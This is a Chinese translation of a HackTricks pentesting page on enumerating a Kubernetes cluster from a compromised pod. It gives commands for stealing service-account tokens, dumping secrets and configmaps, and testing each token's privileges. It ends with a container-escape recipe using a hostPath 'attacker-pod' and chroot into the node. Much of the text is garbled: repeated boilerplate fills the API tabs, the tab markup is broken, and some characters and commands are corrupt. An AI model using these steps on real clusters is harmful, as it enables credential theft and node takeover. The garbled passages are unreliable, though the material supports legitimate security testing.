# Kubernetes枚举

{% hint style="success" %}
学习并练习AWS Hacking：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习并练习GCP Hacking：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享黑客技巧。

</details>
{% endhint %}

## Kubernetes令牌

如果您已经破坏了对某台机器的访问权限，用户可能可以访问某些Kubernetes平台。令牌通常位于由**环境变量`KUBECONFIG`**指向的文件中，或者**在`~/.kube`**中。

在这个文件夹中，您可能会找到包含**连接到API服务器的令牌和配置**的配置文件。在这个文件夹中，您还可以找到一个包含先前检索信息的缓存文件夹。

如果您已经破坏了Kubernetes环境中的一个pod，还有其他地方可以找到令牌和有关当前K8环境的信息：

### 服务账户令牌

在继续之前，如果您不知道Kubernetes中的服务是什么，我建议您**跟随此链接并至少阅读有关Kubernetes架构的信息**。

来自Kubernetes[文档](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server)：

_“当您创建一个pod时，如果您没有指定服务账户，它将自动分配给_默认_命名空间中的默认_服务账户。”_

**ServiceAccount**是由Kubernetes管理的对象，用于为在pod中运行的进程提供身份。\
每个服务账户都有一个与之相关的秘密，该秘密包含一个持有者令牌。这是一个JSON Web令牌（JWT），用于在两个方之间安全地表示声明的方法。

通常**一个**目录：

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

包含以下文件：

* **ca.crt**：用于检查Kubernetes通信的ca证书
* **namespace**：指示当前命名空间
* **token**：包含当前pod的**服务令牌**。

现在您有了令牌，您可以在环境变量**`KUBECONFIG`**中找到API服务器。要获取更多信息，请运行`(env | set) | grep -i "kuber|kube`**`"`**

服务账户令牌由文件**sa.key**中的密钥签名，并由**sa.pub**验证。

**Kubernetes**上的默认位置：

* /etc/kubernetes/pki

**Minikube**上的默认位置：

* /var/lib/localkube/certs

### 热点Pods

_**热点Pods**_是包含特权服务账户令牌的Pods。特权服务账户令牌是具有执行特权任务权限的令牌，例如列出秘密、创建Pod等。

## RBAC

如果您不知道**RBAC**是什么，请**阅读本节**。

## 枚举速查表

为了枚举K8s环境，您需要以下几点：

* 一个**有效的身份验证令牌**。在前一节中，我们看到了在哪里搜索用户令牌和服务账户令牌。
* Kubernetes API的**地址（_**https://host:port**_**）**。这通常可以在环境变量和/或kube配置文件中找到。
* **可选项**：**ca.crt用于验证API服务器**。这可以在找到令牌的地方找到。这对于验证API服务器证书很有用，但使用`kubectl`的`--insecure-skip-tls-verify`或`curl`的`-k`，您将不需要此文件。

有了这些细节，您就可以**枚举Kubernetes**。如果由于某种原因**API**可以通过**互联网访问**，您可以直接从您的主机下载该信息并枚举平台。

然而，通常**API服务器位于内部网络中**，因此您需要通过受损的机器创建一个隧道以从您的机器访问它，或者您可以**上传**[**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)二进制文件，或使用**`curl/wget/anything`**执行原始HTTP请求到API服务器。

### `list`和`get`动词之间的区别

使用**`get`**权限，您可以访问特定资产的信息（`kubectl`中的`describe`选项）。
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
如果您拥有**`list`**权限，则允许您执行API请求来列出某种类型的资产（_`kubectl`_中的`get`选项）：
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
如果您拥有**`watch`**权限，您可以执行API请求来监视资产：
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
他们打开了一个流连接，每当 Deployment 发生变化（或创建新的 Deployment 时），就会返回完整的清单。

{% hint style="danger" %}
以下 `kubectl` 命令仅指示如何列出对象。如果要访问数据，需要使用 `describe` 而不是 `get`。
{% endhint %}

### 使用 curl

从 Pod 内部，您可以使用多个环境变量：
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
默认情况下，pod 可以访问域名 `kubernetes.default.svc` 中的 kube-api 服务器，并且您可以在 `/etc/resolv.config` 中看到 kube 网络，因为您将找到 kubernetes DNS 服务器的地址（同一范围的 ".1" 是 kube-api 终端点）。
{% endhint %}

### 使用 kubectl

拥有令牌和 API 服务器的地址后，您可以使用 kubectl 或 curl 访问它，如下所示：

默认情况下，APISERVER 使用 `https://` 模式通信
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> 如果 URL 中没有 `https://`，可能会收到类似 Bad Request 的错误。

您可以在[**这里找到官方 kubectl 技巧表**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/)。以下各节的目标是以有序方式呈现不同的选项，以枚举和了解您已经访问的新 K8s。

要查找 `kubectl` 发送的 HTTP 请求，可以使用参数 `-v=8`

#### MitM kubectl - 代理化 kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### 当前配置

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

如果您成功窃取了一些用户凭据，您可以使用类似以下方式**在本地配置**：
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### 获取支持的资源

通过这些信息，您将了解可以列出的所有服务

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### 获取当前权限

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes API 枚举

在进行 Kubernetes 渗透测试时，枚举 Kubernetes API 是非常重要的一步。以下是一些常见的方法：

### 1. **访问 Kubernetes API 服务器**

您可以使用 `kubectl` 命令行工具或直接通过 HTTP 访问 Kubernetes API 服务器。确保您拥有足够的权限来执行此操作。

### 2. **使用 `kubectl` 命令**

使用 `kubectl` 命令可以列出集群中的资源，例如 `kubectl get pods`、`kubectl get nodes` 等。

### 3. **访问 API 端点**

尝试访问 Kubernetes API 端点，例如 `https://<cluster-ip>/api` 或 `https://<cluster-ip>/api/v1`.

### 4. **使用 Kubernetes Dashboard**

如果集群中安装了 Kubernetes Dashboard，您可以尝试访问该仪表板并查看相关信息。

### 5. **扫描工具**

使用专门的扫描工具，如 kube-hunter，来帮助发现潜在的安全问题。

### 6. **查找未经授权的端点**

搜索集群中可能存在的未经授权的 API 端点，这可能会导致安全风险。

### 7. **审查 RBAC 配置**

审查 Role-Based Access Control (RBAC) 配置，确保只有授权的用户可以访问特定资源。

### 8. **监控 API 活动**

监控 Kubernetes API 的活动，及时发现异常行为。

### 9. **查找敏感信息**

检查 API 响应中是否包含敏感信息，如密码、密钥等。

### 10. **审查日志**

审查 Kubernetes API 服务器的日志，以了解谁访问了 API 以及执行了什么操作。

通过这些方法，您可以更好地了解 Kubernetes 集群的安全性，并发现潜在的安全风险。

{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

另一种检查您权限的方法是使用工具：[**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

您可以在以下了解更多关于**Kubernetes RBAC**的信息：

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**一旦您知道您拥有的权限**，请查看以下页面以确定**是否可以滥用它们**以提升权限：

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### 获取其他角色

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes API 枚举

在进行 Kubernetes 渗透测试时，枚举 Kubernetes API 是非常重要的一步。以下是一些常见的方法：

### 1. **访问 Kubernetes API 服务器**

您可以使用 `kubectl` 命令行工具或直接通过 HTTP 访问 Kubernetes API 服务器。确保您拥有足够的权限来执行此操作。

### 2. **使用 `kubectl` 命令**

使用 `kubectl` 命令可以列出集群中的所有资源，例如 `kubectl get pods`、`kubectl get nodes` 等。

### 3. **访问 API 端点**

尝试访问以下常见的 API 端点：

- `/api`
- `/api/v1`
- `/apis`
- `/apis/apps`
- `/apis/extensions`

### 4. **使用 Kubernetes API 客户端**

您可以使用像 `Postman` 或 `curl` 这样的工具来与 Kubernetes API 进行交互，从而枚举集群中的资源和配置。

### 5. **查找未经授权的 API 访问**

确保没有未经授权的 API 访问，以防止恶意用户利用这些漏洞。

### 6. **检查 RBAC 配置**

查看集群中的 Role-Based Access Control (RBAC) 配置，确保只有授权用户可以访问特定的 API。

### 7. **审查 Service Account 权限**

检查 Service Account 的权限，确保它们被正确配置以限制对 API 的访问。

### 8. **监视 API 活动**

定期监视 Kubernetes API 的活动，以便及时发现任何异常行为。

通过这些方法，您可以更好地了解 Kubernetes 集群中的 API，并确保其安全性。

{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
### 获取命名空间

Kubernetes支持由同一物理集群支持的**多个虚拟集群**。这些虚拟集群被称为**命名空间**。
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes API 枚举

在进行 Kubernetes 渗透测试时，枚举 Kubernetes API 是非常重要的一步。以下是一些常见的方法：

1. **访问 kube-apiserver**：尝试访问 kube-apiserver，通常在 `https://<cluster-ip>:6443` 上监听。

2. **使用 kubectl**：使用 kubectl 命令行工具与 API 进行交互，例如 `kubectl get pods`。

3. **访问 API 资源**：枚举不同的 API 资源，如 pods、deployments、services 等。

4. **查看 API 版本**：确定 Kubernetes API 的版本，可能会影响可用的功能和漏洞。

5. **检查 RBAC 配置**：查看角色基于访问控制（RBAC）配置，了解哪些权限被授予给了当前用户。

6. **扫描未经授权的端点**：扫描集群中的未经授权的 API 端点，可能会发现安全问题。

7. **使用工具**：使用专门的工具如 kube-hunter 进行自动化的 API 枚丗。

记住，在进行 Kubernetes API 枚举时要格外小心，避免对生产环境造成影响。

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### 获取秘密信息

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Kubernetes Enumeration

#### Service Accounts

Service accounts can be used to interact with the Kubernetes API. Enumerate service accounts to identify potential targets for privilege escalation.

- **List Service Accounts:**
  ```bash
  kubectl get serviceaccounts --all-namespaces
  ```

- **Describe Service Account:**
  ```bash
  kubectl describe serviceaccount <service-account-name> -n <namespace>
  ```

- **List Service Account Tokens:**
  ```bash
  kubectl get secrets --namespace <namespace> | grep <service-account-name>
  ```

- **Decode Service Account Token:**
  ```bash
  kubectl get secret <service-account-token> -n <namespace> -o json | jq -r .data.token | base64 -d
  ```

#### Pods

Pods are the smallest deployable units in Kubernetes. Enumerate pods to discover running applications and potential vulnerabilities.

- **List Pods:**
  ```bash
  kubectl get pods --all-namespaces
  ```

- **Describe Pod:**
  ```bash
  kubectl describe pod <pod-name> -n <namespace>
  ```

- **Access Pod Shell:**
  ```bash
  kubectl exec -it <pod-name> -n <namespace> -- /bin/sh
  ```

#### Nodes

Nodes are the worker machines in a Kubernetes cluster. Enumerate nodes to gather information about the cluster infrastructure.

- **List Nodes:**
  ```bash
  kubectl get nodes
  ```

- **Describe Node:**
  ```bash
  kjson -o jsonpath='{.status.addresses[?(@.type=="ExternalIP")].address}' | head -n 1
  ```

- **Access Node Shell:**
  ```bash
  ssh <node-external-ip>
  ```

#### RBAC

Role-Based Access Control (RBAC) defines access policies for Kubernetes resources. Enumerate RBAC roles and role bindings to identify potential misconfigurations.

- **List Roles:**
  ```bash
  kubectl get roles --all-namespaces
  ```

- **List Role Bindings:**
  ```bash
  kubectl get rolebindings --all-namespaces
  ```

- **Describe Role:**
  ```bash
  kubectl describe role <role-name> -n <namespace>
  ```

- **Describe Role Binding:**
  ```bash
  kubectl describe rolebinding <role-binding-name> -n <namespace>
  ```

</details>
{% endtab %}
```
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

如果您可以读取秘密，您可以使用以下行来获取与每个令牌相关的特权：
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### 获取服务账户

正如在本页开头讨论的那样，**当一个 Pod 运行时，通常会分配一个服务账户给它**。因此，列出服务账户、它们的权限以及它们所在的位置可能允许用户提升权限。

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}在进行Kubernetes枚举时，API是一个重要的目标。您可以使用kubectl命令行工具与Kubernetes API进行交互。以下是一些有用的kubectl命令：

- 列出所有命名空间：`kubectl get namespaces`
- 列出所有Pods：`kubectl get pods --all-namespaces`
- 列出所有服务：`kubectl get services --all-namespaces`
- 列出所有部署：`kubectl get deployments --all-namespaces`

您还可以使用`kubectl proxy`命令在本地启动代理服务器，以便直接访问Kubernetes API。{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### 获取部署

部署指定需要运行的**组件**。
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes API 枚举

在进行 Kubernetes 渗透测试时，枚举 Kubernetes API 是非常重要的一步。以下是一些常见的方法：

### 1. **访问 Kubernetes API 服务器**

您可以使用 `kubectl` 命令行工具或直接通过 HTTP 访问 Kubernetes API 服务器。确保您拥有足够的权限来执行此操作。

### 2. **使用 `kubectl` 命令**

使用 `kubectl` 命令可以列出集群中的所有资源，例如 `kubectl get all`。

### 3. **访问 API 端点**

尝试访问以下常见的 API 端点：

- `/api`
- `/apis`
- `/healthz`
- `/version`

### 4. **查找未经授权的端点**

有时会发现未经授权访问的 API 端点，可能会泄露敏感信息或导致安全风险。

### 5. **使用自动化工具**

您还可以使用自动化工具如 `kube-hunter` 或 `kubetap` 来帮助枚举 Kubernetes API。

### 6. **检查 RBAC 配置**

查看角色基于访问控制（RBAC）配置，以了解哪些权限分配给了不同的用户或服务账户。

### 7. **审查 Service Account**

审查集群中的服务账户，确保它们被正确配置并且没有过多的权限。

### 8. **监控 API 活动**

监控 Kubernetes API 的活动，及时发现异常行为。

### 9. **查找敏感信息**

在 API 响应中查找敏感信息，如凭证、配置文件等。

### 10. **审查网络策略**

审查网络策略以确保适当限制了对 Kubernetes API 的访问。

</div>
{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
### 获取 Pods

Pods 是实际将运行的容器。
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes API 枚举

在进行 Kubernetes 渗透测试时，枚举 Kubernetes API 是非常重要的一步。以下是一些常见的方法：

### 1. **访问 Kubernetes API 服务器**

您可以使用 `kubectl` 命令行工具或直接通过 HTTP 访问 Kubernetes API 服务器。确保您具有足够的权限来执行此操作。

### 2. **使用 `kubectl` 列出资源**

使用 `kubectl` 命令可以列出集群中的各种资源，例如 Pods、Services、Deployments 等。这可以帮助您了解集群中正在运行的工作负载。

### 3. **查找未经授权的服务帐户**

检查集群中是否存在未经授权的服务帐户，这可能会导致安全风险。

### 4. **扫描 API 服务器**

使用工具如 `kube-hunter` 可以扫描 Kubernetes 集群，发现潜在的安全漏洞和风险。

### 5. **查找敏感信息**

检查 API 响应中是否包含敏感信息，如密码、密钥或其他凭据。

### 6. **审查 RBAC 配置**

审查 Role-Based Access Control（RBAC）配置，确保只有授权的用户可以访问特定资源。

### 7. **监控 API 调用**

设置监控机制，以便及时发现异常的 API 调用，可能是恶意行为的迹象。

### 8. **审查审计日志**

审查审计日志，以便跟踪对 Kubernetes API 的访问和操作。

通过这些方法，您可以更全面地了解 Kubernetes 集群的安全状况，并及时采取必要的措施来加强安全性。

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
### 获取服务

Kubernetes **服务** 用于**在特定端口和IP上公开服务**（该端口和IP将充当实际提供服务的 pod 的负载均衡器）。了解在哪里可以找到其他服务以尝试攻击是很有趣的。

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

## 枚举 Kubernetes API

在进行 Kubernetes 渗透测试时，枚举 Kubernetes API 是非常重要的一步。以下是一些常见的方法：

1. **访问 API 服务器**：尝试访问 Kubernetes API 服务器（通常在 `https://<cluster-ip>:<port>`）。可以使用 `kubectl` 命令行工具或者直接发送 HTTP 请求。

2. **探测 API 路径**：尝试发现暴霓露的 API 路径，例如 `/api`、`/apis`、`/version` 等。

3. **列举资源**：使用 API 调用来列丨举集群中的资源，例如 `kubectl get all` 命令。

4. **查找敏感信息**：搜索敏感信息，如 Pod、Secrets、ConfigMaps 等。

5. **扫描未授权访问**：扫揠集群中是否存在未授权访问的漏洞，例如匿名用户可以访问的资源。

6. **审查 RBAC 配置**：检查 Role-Based Access Control（RBAC）配置，查看哪些权限袪被授予给了不同的用户或服务账户。

7. **检查 Web 控制台**：如果启用了 Kubernetes Web 控制台，确保已经进行了适当的安全配置。

8. **使用工具**：使用专门的工具如 `kube-hunter` 来自动化枚举 Kubernetes 集群中的安全问题。

枚举 Kubernetes API 可以帮助发现潜在的安全风险，为后续的渗透测试提供重要信息。

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
### 获取节点

获取集群中配置的所有节点。

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes API 枚举

在进行 Kubernetes 渗透测试时，枚举 Kubernetes API 是非常重要的一步。以下是一些常见的方法：

### 1. **访问 Kubernetes API 服务器**

您可以使用 `kubectl` 命令行工具或直接通过 HTTP 访问 Kubernetes API 服务器。确保您拥有足够的权限来执行此操作。

### 2. **使用 `kubectl` 列出资源**

使用 `kubectl` 命令可以列出集群中的各种资源，例如 pods、deployments、services 等。这可以帮助您了解集群中正在运行的工作负载。

### 3. **查找未经授权的服务帐户**

检查集群中是否存在未经授权的服务帐户，这可能会导致安全风险。

### 4. **扫描 API 服务器**

使用工具如 kube-hunter 或 kubei 进行主动扫描，以发现潜在的安全问题。

### 5. **查找敏感信息**

检查 API 对象中是否包含敏感信息，如密码、密钥等。

### 6. **审查 RBAC 配置**

审查角色基于访问控制（RBAC）配置，确保只有授权用户可以访问特定资源。

### 7. **监控 API 活动**

监控 Kubernetes API 的活动，及时发现异常行为。

### 8. **审查审计日志**

审查审计日志，以跟踪对 Kubernetes API 的访问和操作。

通过这些方法，您可以更好地了解 Kubernetes 集群的安全性，并发现潜在的安全漏洞。

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
### 获取 DaemonSets

**DaemonSets** 允许确保集群中的所有节点（或所选节点）上都运行着一个**特定的 pod**。如果删除 DaemonSet，则由其管理的 pod 也将被移除。
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}在Kubernetes中，API服务器是集群中的关键组件之一。通过枚举Kubernetes API，黑客可以发现有关集群配置、部署和服务的重要信息。以下是一些用于枚举Kubernetes API的常见技术：

- **访问控制列表（ACL）枚举**：尝试访问`/api`和`/apis`端点以获取API组的列表。
- **资源枚举**：使用`/apis/{api-group}/{version}/`端点来列出特定API组中的资源。
- **版本枚举**：尝试访问`/api/{version}`端点以获取支持的API版本。
- **命名空间枚举**：使用`/api/{version}/namespaces/`端点来列出集群中的命名空间。

这些技术可以帮助黑客了解Kubernetes集群的结构和配置，为进一步的攻击提供有用的信息。{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### 获取 cronjob

Cron 作业允许使用类似 crontab 的语法安排启动一个将执行某些操作的 pod。
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes Enumeration

### Service Accounts

Service accounts can be used to interact with the Kubernetes API. Enumerate service accounts to find any with excessive permissions.

#### List service accounts

```bash
kubectl get serviceaccounts --all-namespaces
```

#### Describe service account

```bash
kubectl describe serviceaccount <service_account_name> -n <namespace>
```

#### List service account tokens

```bash
kubectl get secrets --all-namespaces | grep <service_account_name>
``json
```
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
### 获取 configMap

configMap 中始终包含大量信息和配置文件，为在 Kubernetes 中运行的应用程序提供支持。通常，您可以找到许多用于连接和验证其他内部/外部服务的密码、秘钥和令牌。
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %} 

## Kubernetes API 枚举

在进行 Kubernetes 渗透测试时，枚举 Kubernetes API 是非常重要的一步。以下是一些常见的方法：

### 1. **访问 Kubernetes API 服务器**

您可以使用 `kubectl` 命令行工具或直接通过 HTTP 访问 Kubernetes API 服务器。确保您拥有足够的权限来执行这些操作。

### 2. **使用 `kubectl` 列出资源**

使用 `kubectl` 命令可以列出集群中的各种资源，例如 Pods、Services、Deployments 等。这可以帮助您了解集群中正在运行的工作负载。

### 3. **查找未经授权的服务账户**

检查集群中是否存在未经授权的服务账户，这可能会导致安全风险。

### 4. **扫描 API 服务器**

使用工具如 `kube-hunter` 可以扫描 Kubernetes 集群的 API 服务器，发现潜在的安全漏洞。

### 5. **检查 RBAC 配置**

审查集群中的 Role-Based Access Control（RBAC）配置，确保只有授权的实体可以访问特定资源。

### 6. **查找敏感信息**

搜索 Pod 描述文件、环境变量和其他资源，查找可能泄露敏感信息的地方。

### 7. **监控 API 调用**

设置监控机制，跟踪和记录对 Kubernetes API 的所有调用，以便及时发现异常行为。

通过这些方法，您可以更好地了解 Kubernetes 集群的安全状况，并及时采取必要的措施来加强安全性。

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### 获取 "all"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **获取Pod的资源消耗**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
### 从容器中逃脱

如果您能够创建新的容器，那么您可能能够从中逃脱到节点。为了做到这一点，您需要使用一个yaml文件创建一个新的容器，切换到创建的容器，然后chroot到节点的系统中。您可以使用已经存在的容器作为yaml文件的参考，因为它们显示了现有的镜像和路径。
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> 如果您需要在特定节点上创建 pod，可以使用以下命令获取节点上的标签
>
> `k get nodes --show-labels`
>
> 通常，kubernetes.io/hostname 和 node-role.kubernetes.io/master 都是用于选择的好标签。
>
> [参考链接]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

然后创建您的 attack.yaml 文件
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[原始yaml源](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

之后，您创建pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
现在您可以按照以下步骤切换到创建的 pod：
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
最后，您将chroot进入节点的系统
```bash
chroot /root /bin/bash
```
信息来源：[Kubernetes Namespace Breakout using Insecure Host Path Volume — Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube – Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## 参考资料

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
学习和实践 AWS Hacking：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习和实践 GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 检查 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
